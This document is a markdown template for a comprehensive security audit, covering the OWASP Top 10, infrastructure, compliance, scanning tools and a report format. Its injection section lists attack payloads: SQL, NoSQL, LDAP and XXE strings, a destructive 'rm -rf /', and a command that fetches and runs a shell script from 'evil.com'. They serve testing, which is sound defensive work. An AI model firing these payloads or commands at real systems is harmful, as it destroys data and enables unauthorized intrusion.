# 🔒 Comprehensive Security Audit Prompt

## Context
You are conducting a thorough security audit to identify vulnerabilities, assess risks, and provide actionable remediation strategies. This audit covers application security, infrastructure security, and compliance requirements.

## Security Audit Framework

### Phase 1: Reconnaissance & Discovery

#### 1.1 Application Inventory
Document all components:
```yaml
Application Stack:
  frontend:
    - Technologies used
    - Third-party libraries
    - API endpoints consumed
    
  backend:
    - Frameworks and versions
    - Dependencies and versions
    - External service integrations
    
  infrastructure:
    - Cloud providers
    - Container orchestration
    - Network architecture
    
  data_stores:
    - Databases and versions
    - Cache systems
    - File storage locations
```

#### 1.2 Attack Surface Analysis
```yaml
Entry Points:
  public_endpoints:
    - REST APIs
    - GraphQL endpoints
    - WebSocket connections
    - File upload endpoints
    
  authentication:
    - Login pages
    - Password reset flows
    - OAuth providers
    - API key mechanisms
    
  user_inputs:
    - Forms and fields
    - URL parameters
    - File uploads
    - Headers and cookies
```

### Phase 2: Vulnerability Assessment

#### 2.1 OWASP Top 10 Analysis

##### A01:2021 – Broken Access Control
Check for:
```python
# Test cases
- Horizontal privilege escalation
- Vertical privilege escalation
- Missing function level access control
- Insecure direct object references (IDOR)
- CORS misconfiguration
- Force browsing vulnerabilities

# Example test
GET /api/users/123/profile  # As user 456
GET /api/admin/users       # As regular user
DELETE /api/posts/789      # As non-owner
```

##### A02:2021 – Cryptographic Failures
Assess:
```yaml
Encryption Review:
  data_at_rest:
    - Database encryption
    - File system encryption
    - Backup encryption
    
  data_in_transit:
    - TLS versions (minimum 1.2)
    - Certificate validation
    - Cipher suites strength
    
  sensitive_data:
    - Password hashing (bcrypt, scrypt, Argon2)
    - PII encryption
    - Key management practices
```

##### A03:2021 – Injection
Test for:
```sql
-- SQL Injection tests
' OR '1'='1
'; DROP TABLE users; --
' UNION SELECT * FROM passwords --

-- NoSQL Injection
{"$ne": null}
{"$gt": ""}
{"$where": "this.password == 'test'"}

-- Command Injection
; ls -la
| whoami
`rm -rf /`
$(curl evil.com/shell.sh | bash)

-- LDAP Injection
*)(uid=*))(|(uid=*
*)(|(password=*))

-- XML/XXE Injection
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

##### A04:2021 – Insecure Design
Review:
```yaml
Design Flaws:
  threat_modeling:
    - Missing security requirements
    - Insufficient rate limiting
    - Weak account recovery
    
  business_logic:
    - Race conditions
    - Time-of-check/Time-of-use
    - Insufficient workflow validation
    
  api_design:
    - Over-privileged endpoints
    - Excessive data exposure
    - Missing versioning strategy
```

##### A05:2021 – Security Misconfiguration
Check:
```yaml
Configuration Issues:
  default_settings:
    - Default passwords
    - Unnecessary features enabled
    - Verbose error messages
    
  headers:
    - Missing security headers
    - Permissive CORS policies
    - Weak CSP directives
    
  permissions:
    - Overly permissive file permissions
    - Unnecessary open ports
    - Public cloud storage buckets
```

#### 2.2 Authentication & Session Management
```yaml
Authentication Tests:
  password_policies:
    - Minimum length (12+ characters)
    - Complexity requirements
    - Password history
    - Account lockout (5 attempts)
    
  session_management:
    - Session timeout (30 min inactive)
    - Secure session cookies
    - Session fixation protection
    - Concurrent session handling
    
  multi_factor:
    - MFA implementation
    - Backup codes
    - Recovery mechanisms
```

#### 2.3 API Security
```yaml
API Security Checks:
  authentication:
    - API key security
    - OAuth implementation
    - JWT validation
    
  rate_limiting:
    - Per-user limits
    - Per-IP limits
    - Endpoint-specific limits
    
  input_validation:
    - Schema validation
    - Type checking
    - Size limits
    - Character whitelisting
```

### Phase 3: Infrastructure Security

#### 3.1 Network Security
```yaml
Network Assessment:
  perimeter_security:
    - Firewall rules
    - Network segmentation
    - VPN configuration
    
  internal_security:
    - Zero trust principles
    - Micro-segmentation
    - East-west traffic monitoring
    
  cloud_security:
    - Security groups
    - Network ACLs
    - VPC configuration
```

#### 3.2 Container Security
```bash
# Docker security scan
docker scan <image>

# Check for:
- Base image vulnerabilities
- Exposed secrets in layers
- Running as root
- Unnecessary capabilities
- Missing security updates

# Kubernetes security
kubectl auth can-i --list
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}'
```

### Phase 4: Code Security Review

#### 4.1 Static Analysis
```yaml
Code Review Focus:
  dangerous_functions:
    - eval() usage
    - exec() calls
    - Deserialization
    - File operations
    
  input_handling:
    - User input validation
    - Output encoding
    - Parameterized queries
    
  crypto_usage:
    - Hard-coded secrets
    - Weak algorithms
    - Improper randomness
```

#### 4.2 Dependency Analysis
```bash
# JavaScript
npm audit
npm audit fix

# Python
pip-audit
safety check

# Java
dependency-check --project "MyApp" --scan .

# Check for:
- Known vulnerabilities (CVEs)
- Outdated packages
- License compliance
- Transitive dependencies
```

### Phase 5: Compliance & Privacy

#### 5.1 Data Privacy
```yaml
Privacy Assessment:
  data_collection:
    - Minimal data principle
    - Purpose limitation
    - Consent mechanisms
    
  data_storage:
    - Retention policies
    - Right to deletion
    - Data portability
    
  data_sharing:
    - Third-party processors
    - Cross-border transfers
    - Data anonymization
```

#### 5.2 Compliance Checks
```yaml
Regulatory Compliance:
  GDPR:
    - Privacy policy
    - Cookie consent
    - Data processing records
    - DPO appointment
    
  PCI_DSS:
    - Card data handling
    - Network segmentation
    - Access controls
    - Encryption standards
    
  HIPAA:
    - PHI protection
    - Access logging
    - Encryption requirements
    - Business associate agreements
```

## Security Testing Tools

### Automated Scanning
```bash
# Web Application Scanning
nikto -h https://target.com
owasp-zap -quickurl https://target.com

# Network Scanning
nmap -sV -sC -O target.com
masscan -p1-65535 target.com

# SSL/TLS Testing
sslyze --regular target.com
testssl.sh target.com

# Dependency Scanning
snyk test
trivy image myapp:latest
```

### Manual Testing Checklist
```yaml
Manual Tests:
  authentication:
    - [ ] Password reset token randomness
    - [ ] Session token entropy
    - [ ] Account enumeration
    - [ ] Timing attacks
    
  authorization:
    - [ ] Privilege escalation paths
    - [ ] Object level authorization
    - [ ] Function level authorization
    - [ ] Data filtering
    
  business_logic:
    - [ ] Race conditions
    - [ ] Workflow bypasses
    - [ ] Price manipulation
    - [ ] Inventory attacks
```

## Remediation Strategies

### Priority Matrix
```yaml
Critical (Fix Immediately):
  - Remote code execution
  - SQL injection
  - Authentication bypass
  - Sensitive data exposure
  
High (Fix within 7 days):
  - Cross-site scripting
  - Broken access control
  - Security misconfiguration
  
Medium (Fix within 30 days):
  - Information disclosure
  - Missing security headers
  - Weak cryptography
  
Low (Fix within 90 days):
  - Best practice violations
  - Defense in depth improvements
```

### Security Headers Implementation
```yaml
Required Headers:
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
  X-XSS-Protection: 1; mode=block
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: geolocation=(), microphone=(), camera=()
```

## Report Template

### Executive Summary
```markdown
## Security Audit Report - [Application Name]
Date: [Date]
Auditor: [Name]

### Overview
Brief description of audit scope and methodology.

### Key Findings
- Critical: X vulnerabilities
- High: Y vulnerabilities  
- Medium: Z vulnerabilities
- Low: W vulnerabilities

### Risk Assessment
Overall risk level: [Critical/High/Medium/Low]

### Recommendations
1. Immediate actions required
2. Short-term improvements
3. Long-term security roadmap
```

### Detailed Findings
```markdown
## Finding #1: [Vulnerability Name]
**Severity**: Critical/High/Medium/Low
**Category**: OWASP Top 10 Category
**Affected Component**: [Component/Endpoint]

### Description
Detailed description of the vulnerability.

### Impact
Potential impact if exploited.

### Proof of Concept
```code
Example exploit code or steps
```

### Remediation
Step-by-step fix instructions.

### References
- OWASP Guide
- CVE Details
- Vendor Documentation
```

## Continuous Security

### Security Pipeline Integration
```yaml
CI/CD Security:
  pre_commit:
    - Secret scanning
    - Linting
    
  build_phase:
    - SAST scanning
    - Dependency check
    
  test_phase:
    - DAST scanning
    - Security tests
    
  deploy_phase:
    - Configuration validation
    - Infrastructure scanning
    
  runtime:
    - RASP monitoring
    - Anomaly detection
```

### Security Metrics
```yaml
KPIs:
  vulnerability_metrics:
    - Mean time to detect (MTTD)
    - Mean time to remediate (MTTR)
    - Vulnerability density
    
  compliance_metrics:
    - Policy compliance rate
    - Security training completion
    - Audit finding closure rate
    
  operational_metrics:
    - Security incident rate
    - False positive rate
    - Security test coverage
```

## Final Checklist

- [ ] All OWASP Top 10 categories tested
- [ ] Authentication mechanisms verified
- [ ] Authorization controls validated
- [ ] Input validation confirmed
- [ ] Cryptography implementation reviewed
- [ ] Session management tested
- [ ] Error handling checked
- [ ] Logging and monitoring verified
- [ ] Third-party components scanned
- [ ] Infrastructure security assessed
- [ ] Compliance requirements met
- [ ] Security headers implemented
- [ ] API security validated
- [ ] Remediation plan created
- [ ] Report delivered to stakeholders